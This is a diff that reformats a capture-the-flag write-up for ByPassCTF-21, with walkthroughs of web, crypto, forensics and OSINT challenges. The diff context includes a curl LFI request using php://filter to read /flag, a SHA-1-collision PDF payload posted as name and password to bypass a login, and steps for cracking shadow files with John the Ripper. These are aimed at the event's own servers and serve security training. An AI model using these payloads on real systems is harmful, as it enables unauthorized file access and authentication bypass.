@@ -28,7 +28,7 @@ You can find the homepage for this CTF
     Welcome to clover kingdom :) visit here : http://40.65.167.131/
 
 By enumerating the directory using tools like dirsearch, you’ll get a
-security.txt as *.well-known/security.txt *giving a hint as **devil **indicating
+security.txt as **.well-known/security.txt** giving a hint as **devil** indicating
 that we can do an LFI attack on this parameter using this:
 
     curl -X POST http://40.65.167.131/ -d "devil=php://filter/resource=/flag”
@@ -47,7 +47,7 @@ password parameters.
 
     curl -X POST http://168.63.250.254/ -d "name=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%20%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&password=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1"
 
-Note: Try on Linux if doesn’t works on Windows.
+> Note: Try on Linux if doesn’t works on Windows.
 
 ![](https://cdn-images-1.medium.com/max/800/1*FazmL-XlBGjrzLL43PUaLw.png)
 <br><span class="figcaption_hack">FLAG</span>
@@ -69,7 +69,7 @@ combination for n and divide it by p to get q and also verify if q which we’ve
 got is prime or not, if it is prime then try to decode the encrypted flag.
 Here’s the Python script for the above mentioned process.
 
-<script src="https://gist.github.com/codekingdroid/28a1c63a71ab150195bb64aa938c8325.js"></script>
+**<a href="https://gist.github.com/codekingdroid/28a1c63a71ab150195bb64aa938c8325">RSA1.py</a>**
 
 ![](https://cdn-images-1.medium.com/max/800/1*faYPrJawSAWqUiVPLFvZKw.png)
 <br><span class="figcaption_hack">FLAG</span>
@@ -78,11 +78,13 @@ Here’s the Python script for the above mentioned process.
 
     I xored my secret file and I noted the time when I did this. This is what I have for you 
 
-    Files: [enc_flag](https://github.com/codekingdroid/ByPassCTF-21/blob/main/CRYPTO/Little_Information_Leaks_A_Lot/enc_flag) & [main.py](https://github.com/codekingdroid/ByPassCTF-21/blob/main/CRYPTO/Little_Information_Leaks_A_Lot/main.py) 
+    Files: <a href="https://github.com/codekingdroid/ByPassCTF-21/blob/main/CRYPTO/Little_Information_Leaks_A_Lot/enc_flag">[enc_flag]</a> & <a href="https://github.com/codekingdroid/ByPassCTF-21/blob/main/CRYPTO/Little_Information_Leaks_A_Lot/main.py">[main.py]</a>
 
 In this challenge we are given the date and time and I am also using that as
-seed but *time.time()* return seconds, so we have to convert the given date into
+seed but **time.time()** return seconds, so we have to convert the given date into
 seconds and use them as seed and then we can reverse the* xor* to get the flag.
+
+**<a href="https://gist.github.com/codekingdroid/134cf36c266518b020c5ad167fc95134">Little_Information_Leaks_A_Lot.py</a>**
 
 ![](https://cdn-images-1.medium.com/max/800/1*wu4OY7aNaZP7vqhyx9admQ.png)
 <br><span class="figcaption_hack">FLAG</span>
@@ -100,12 +102,15 @@ seconds and use them as seed and then we can reverse the* xor* to get the flag.
 
 In this challenge we are given the cipher, N, Q and e so it seems to be easy to
 use any random RSA decryption script to decode it and get the flag. But as I
-promised you have to think not be a script kiddie. When you use any script (
-given below ) to decode this RSA you get an error as below:
+promised you have to think not be a script kiddie. When you use any script 
+(given below ) to decode this RSA you get an error as below:
+
+**<a href="https://gist.github.com/codekingdroid/a46d0d4b3240445b51d47c5fb1835bff">random_rsa.py</a>**
 
 So if you google about this error you’ll find that python throw this error when
-e and phi are not *co-primes*. This time we have to modify our scripts to get
-flag.
+e and phi are not **co-primes**. This time we have to modify our scripts to get flag.
+
+**<a href="https://gist.github.com/codekingdroid/89bf5a5dc8fc6a96b7a9cb5b41c62689">RSA2.py</a>**
 
 ![](https://cdn-images-1.medium.com/max/800/1*Ar2UiohGvK4sQmNrcvUNuw.png)
 <br><span class="figcaption_hack">FLAG</span>
@@ -114,8 +119,7 @@ flag.
 
     You always bully me because of my week encryption algorithm but this time you all will cry :)
 
-    Files: 
-     & 
+    Files: <a href="https://github.com/codekingdroid/ByPassCTF-21/raw/main/CRYPTO/I_will_never_Stop/challenge.zip">challenge.zip</a> & <a href="https://github.com/codekingdroid/ByPassCTF-21/blob/main/CRYPTO/I_will_never_Stop/main.py">main.py</a>
 
 We’re given a zip file and a python code which performs the following
 operations:
@@ -129,23 +133,25 @@ be looked upon as concatenating their char in sorted order of their respective
 num we get a string which is a md5 hash representing a single char of the flag.
 
 The process can be automated using the Python script as given below:
+    
+    **<a href="https://gist.githubusercontent.com/hmrserver/36c4f8427bcbd472ba06e59617de4edc/raw/4604a08b232127145cab0acb6955800a0c7f37cf/I_will_never_Stop.py">I_will_never_Stop.py</a>**
 
 ![](https://cdn-images-1.medium.com/max/800/1*xVfnCCS2CkEnboYKL8Pv5Q.png)
 <br><span class="figcaption_hack">FLAG</span>
 
 ### MISC
 
-1.  **Why we all are fighting :/ (250 | Medium)**
+**1. Why we all are fighting :/ (250 | Medium)**
 
     In todays world everyone is fighting with each other. Some people want to stop this therefore they using technology to stop these riots. But politicians doesn’t want the fights to be stopped therefore they forced us to investigate the system for those persons who want to stop riots. Politicians are saying we will find something serious. Can you help us to prove them wrong?
-    FILE: 
+    FILE: <a href="https://github.com/codekingdroid/ByPassCTF-21/raw/main/MISC/Why%20we%20all%20are%20fighting/need_peace.pcapng">need_peace.pcapng</a>
 
 In this we are given a pcap file, if we check what type of protocols it has,
 we’ll find that it has HTTPS ( TCP ), Telnet, FTP. Now as we know that Telnet
 and FTP traffic is unencrypted so we can check what is passing through it. So if
 you check the FTP traffic you will know that one image is transferred. Now
-convert the image to its *hexdump* from the option in the protocol analyser of
-*Wireshark* and copy that hexdump to *cyberchef* you will get your flag.
+convert the image to its _hexdump_ from the option in the protocol analyser of
+_Wireshark_ and copy that hexdump to _cyberchef_ you will get your flag.
 
 ![](https://cdn-images-1.medium.com/max/800/1*eO7g8r5qjPjZVBfYY4m3Og.png)
 <br><span class="figcaption_hack">FLAG</span>
@@ -154,23 +160,25 @@ convert the image to its *hexdump* from the option in the protocol analyser of
 
     While investigating the solar wind attack we reached to one of the hacker and got something on his system but we are not able to get what this file is or is something more than file that can help us to login into there server.
 
-    FILE: 
+    FILE: <a href="https://github.com/codekingdroid/ByPassCTF-21/raw/main/MISC/Investigation/ByPass_final.bin">ByPass_final.bin</a>
 
-1. Use command ‘*binwalk -e file.bin*’ <br> 2. Use unshadow and then crack the
-shadow and passwd file. <br> 3. Brute force using *JohnTheRipper* to get
-password which is the flag.
+<ol>
+	<li>Use command ‘_binwalk -e file.bin_’ </li><br>
+	<li>Use unshadow and then crack the shadow and passwd file. </li><br>
+	<li>Brute force using _JohnTheRipper_ to get password which is the flag.</li><br>
+</ol>
 
 ![](https://cdn-images-1.medium.com/max/800/1*yyMMnfXGGwGOeZi7TmalaA.png)
 <br><span class="figcaption_hack">FLAG</span>
 
 ### MEM FORENSIC
 
-    File: 
+    File: <a href="https://mega.nz/file/I8MlAQKb#H33ALwBplZ_ddR4f66FTjzGoPhYsGEJVyUP5yeRb_1w">here</a>
 
 Before doing anything we have to find the profile for the image, you can use
 command: *vol.py iamgeinfo -f dump.raw*
 
-1.  **What he executed :/ (100 | Easy)**
+**1. What he executed :/ (100 | Easy)**
 
     Me and My friend SinText started a company named H4x0r Pvt Ltd. But someone from our company had deals with the APT Group and leaked our Internal information even our Red Team Tools Details and lot more passwords for our servers. Now you have to investigate and find all the clues in series So sit with the coffee start the investigation, first thing we got is that he executed something before he did anything . Can you help us?
 
@@ -247,12 +255,12 @@ internet entries.
 
 ### DISK FORENSIC
 
-    File: 
+    File: <a href="https://mega.nz/file/sslwxTZS#04UGnHdA8ilpkqFyudeCUPfeLlC2R_adba7JqEfKXH4">here</a>
 
 As we got the .EO1 we can open it using FTK Imager Tool and when we add it as
 evidence into the tool we got all the directory and contents.
 
-1.  **What he deleted :/**
+**1. What he deleted :/**
 
     We got the Disk of the Insid3r but before we got to him he deleted something can you help us?
 
@@ -288,8 +296,12 @@ we export that file and open in the Wireshark. It have lots of HTTP traffic it
 means we can dump those files. So When we dump all that we found, it have lots
 of JS & CSS files when we check these files then in the jquery.max.js we have
 one code which have xored flag.
+    
+    **<a href="https://gist.github.com/codekingdroid/7f9c12a60d5704b1d29d86e70990f3df">Self-Mistakes.cpp</a>**
 
 Just reverse the code to get the flag
+    
+    **<a href="https://gist.github.com/codekingdroid/466c3763a0b2960df601e0771a619442">self-mistake-sol.py</a>**
 
 ![](https://cdn-images-1.medium.com/max/800/1*pxZJPUt83wU2hUtBjSqi-Q.png)
 <br><span class="figcaption_hack">FLAG</span>
@@ -326,10 +338,9 @@ Just login and you will get your flag
 
 ### OSINT
 
-1.  **GhostsEverywhere(100 | Easy)**
+**1. GhostsEverywhere(100 | Easy)**
 
-    All I have is This image 
-    .
+    All I have is This image <a href="https://github.com/codekingdroid/ByPassCTF-21/raw/main/OSINT/GhostsEverywhere/chall.jpg">here</a>.
 
 Check the metadata of the image you will find ***something is waiting for you at
 qZdp4***. Now read the name carefully it says “Ghost are every where” when you
@@ -359,7 +370,7 @@ to its left half.
 
 ### FORENSIC
 
-1.  **Is_Th3s3_IMp0rt4nt(250 | Medium)**
+**1. Is_Th3s3_IMp0rt4nt(250 | Medium)**
 
     Our organization lost his Red Team Tools. Our Incident Response team have doubt that this attack is only because of some insider. As we have logs of all of our employees can you help us to reach the person who helped them.
 
